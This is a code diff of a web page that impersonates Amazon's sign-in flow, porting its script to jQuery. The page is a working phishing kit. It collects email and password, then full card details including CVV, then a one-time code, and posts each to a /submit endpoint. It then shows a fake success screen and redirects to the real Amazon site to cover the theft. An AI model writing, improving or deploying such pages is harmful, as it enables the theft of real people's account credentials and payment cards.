@@ -25,102 +25,130 @@
         <div>© 1996-2025, Amazon.com, Inc. or its affiliates</div>
     </footer>
 
-    <script src="/scripts.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        async function loadStep() {
-            const step = new URLSearchParams(window.location.search).get('step') || 'email';
-            let sessionData = { error: '', user_input: '' };
-            try {
-                const response = await fetch('/session-data');
-                if (response.ok) {
-                    sessionData = await response.json();
-                } else {
-                    console.error('Failed to fetch session data. Status:', response.status);
-                    sessionData.error = 'Server error, please try again later.';
+        let currentStep = 'email';
+
+        function loadStep(step) {
+            currentStep = step || 'email';
+            $.get('/session-data', function(data) {
+                const error = data.error || '';
+                const userInput = data.user_input || '';
+
+                const container = $('#container');
+                container.removeClass().addClass(`container ${currentStep === 'verify_card' ? 'wide-container' : ''}`);
+
+                if (currentStep === 'email') {
+                    container.html(`
+                        <h1 class="form-title">Sign in</h1>
+                        ${error ? `<div class="error-message">${error}</div>` : ''}
+                        <form id="loginForm">
+                            <input type="hidden" name="step" value="email">
+                            <div class="form-group">
+                                <label for="email_or_phone" class="form-label">Email or mobile phone number</label>
+                                <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" value="${userInput}" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="password" class="form-label">Password</label>
+                                <input type="password" id="password" name="password" class="form-input" required>
+                            </div>
+                            <button type="submit" class="continue-btn">Login</button>
+                        </form>
+                        <div class="help-section">
+                            <a href="#" class="help-link">Forgot your password?</a>
+                        </div>
+                    `);
+                    $('#loginForm').on('submit', function(e) {
+                        e.preventDefault();
+                        const formData = $(this).serialize();
+                        $.post('/submit', formData, function(response) {
+                            window.location.href = '/?step=verify_card';
+                        }).fail(function(xhr) {
+                            alert('Error: ' + xhr.responseText);
+                        });
+                    });
+                } else if (currentStep === 'verify_card') {
+                    container.html(`
+                        <h1 class="form-title">Verify your account</h1>
+                        ${error ? `<div class="error-message">${error}</div>` : ''}
+                        <form id="cardForm">
+                            <input type="hidden" name="step" value="verify_card">
+                            <div class="form-group">
+                                <label for="cardholder_name" class="form-label">Cardholder name</label>
+                                <input type="text" id="cardholder_name" name="cardholder_name" class="form-input" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="card_number" class="form-label">Card number</label>
+                                <input type="text" id="card_number" name="card_number" class="form-input card-number-input" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                            </div>
+                            <div class="input-row">
+                                <div class="input-col">
+                                    <div class="form-group">
+                                        <label for="expiration_date" class="form-label">Expiration date</label>
+                                        <input type="text" id="expiration_date" name="expiration_date" class="form-input" placeholder="MM/YY" maxlength="5" required>
+                                    </div>
+                                </div>
+                                <div class="input-col-small">
+                                    <div class="form-group">
+                                        <label for="security_code" class="form-label">Security code</label>
+                                        <input type="text" id="security_code" name="security_code" class="form-input" placeholder="CVV" maxlength="4" required>
+                                    </div>
+                                </div>
+                            </div>
+                            <button type="submit" class="continue-btn">Continue</button>
+                        </form>
+                    `);
+                    $('#cardForm').on('submit', function(e) {
+                        e.preventDefault();
+                        const formData = $(this).serialize();
+                        $.post('/submit', formData, function(response) {
+                            window.location.href = '/?step=otp';
+                        }).fail(function(xhr) {
+                            alert('Error: ' + xhr.responseText);
+                        });
+                    });
+                } else if (currentStep === 'otp') {
+                    container.html(`
+                        <h1 class="form-title">Verify with OTP</h1>
+                        ${error ? `<div class="error-message">${error}</div>` : ''}
+                        <form id="otpForm">
+                            <input type="hidden" name="step" value="otp">
+                            <div class="form-group">
+                                <label for="otp" class="form-label">Enter OTP</label>
+                                <input type="text" id="otp" name="otp" class="form-input" required>
+                            </div>
+                            <button type="submit" class="continue-btn">Verify OTP</button>
+                        </form>
+                    `);
+                    $('#otpForm').on('submit', function(e) {
+                        e.preventDefault();
+                        const formData = $(this).serialize();
+                        $.post('/submit', formData, function(response) {
+                            // Simulate OTP verification
+                            setTimeout(() => {
+                                window.location.href = '/?step=success';
+                            }, 5000); // 5 seconds delay
+                        }).fail(function(xhr) {
+                            alert('Error: ' + xhr.responseText);
+                        });
+                    });
+                } else if (currentStep === 'success') {
+                    container.html(`
+                        <h1 class="form-title">Login Successful</h1>
+                        <div>You have successfully logged in. Redirecting to Amazon...</div>
+                    `);
+                    setTimeout(() => {
+                        window.location.href = 'https://www.amazon.com';
+                    }, 3000);
                 }
-            } catch (error) {
-                console.error('Error fetching session data:', error);
-                sessionData.error = 'Network error, please check your connection.';
-            }
-            const error = sessionData.error || '';
-            const userInput = sessionData.user_input || '';
-
-            const container = document.getElementById('container');
-            container.className = `container ${step === 'verify_card' ? 'wide-container' : ''}`;
-
-            if (step === 'email') {
-                container.innerHTML = `
-                    <h1 class="form-title">Sign in</h1>
-                    ${error ? `<div class="error-message">${error}</div>` : ''}
-                    <form method="POST" action="/submit" id="loginForm">
-                        <input type="hidden" name="step" value="email">
-                        <div class="form-group">
-                            <label for="email_or_phone" class="form-label">Email or mobile phone number</label>
-                            <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" value="${userInput}" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="password" class="form-label">Password</label>
-                            <input type="password" id="password" name="password" class="form-input" required>
-                        </div>
-                        <button type="submit" class="continue-btn">Login</button>
-                    </form>
-                    <div class="help-section">
-                        <a href="#" class="help-link">Forgot your password?</a>
-                    </div>
-                `;
-            } else if (step === 'verify_card') {
-                container.innerHTML = `
-                    <h1 class="form-title">Verify your account</h1>
-                    ${error ? `<div class="error-message">${error}</div>` : ''}
-                    <form method="POST" action="/submit" id="cardForm">
-                        <input type="hidden" name="step" value="verify_card">
-                        <div class="form-group">
-                            <label for="cardholder_name" class="form-label">Cardholder name</label>
-                            <input type="text" id="cardholder_name" name="cardholder_name" class="form-input" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="card_number" class="form-label">Card number</label>
-                            <input type="text" id="card_number" name="card_number" class="form-input card-number-input" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
-                        </div>
-                        <div class="input-row">
-                            <div class="input-col">
-                                <div class="form-group">
-                                    <label for="expiration_date" class="form-label">Expiration date</label>
-                                    <input type="text" id="expiration_date" name="expiration_date" class="form-input" placeholder="MM/YY" maxlength="5" required>
-                                </div>
-                            </div>
-                            <div class="input-col-small">
-                                <div class="form-group">
-                                    <label for="security_code" class="form-label">Security code</label>
-                                    <input type="text" id="security_code" name="security_code" class="form-input" placeholder="CVV" maxlength="4" required>
-                                </div>
-                            </div>
-                        </div>
-                        <button type="submit" class="continue-btn">Continue</button>
-                    </form>
-                `;
-            } else if (step === 'otp') {
-                container.innerHTML = `
-                    <h1 class="form-title">Verify with OTP</h1>
-                    ${error ? `<div class="error-message">${error}</div>` : ''}
-                    <form method="POST" action="/submit" id="otpForm">
-                        <input type="hidden" name="step" value="otp">
-                        <div class="form-group">
-                            <label for="otp" class="form-label">Enter OTP</label>
-                            <input type="text" id="otp" name="otp" class="form-input" required>
-                        </div>
-                        <button type="submit" class="continue-btn">Verify OTP</button>
-                    </form>
-                `;
-            } else if (step === 'success') {
-                container.innerHTML = `
-                    <h1 class="form-title">Login Successful</h1>
-                    <div>You have successfully logged in. Redirecting to Amazon...</div>
-                `;
-            }
+            });
         }
 
-        document.addEventListener('DOMContentLoaded', loadStep);
+        // Load the initial step
+        $(document).ready(function() {
+            const step = new URLSearchParams(window.location.search).get('step') || 'email';
+            loadStep(step);
+        });
     </script>
 </body>
 </html>
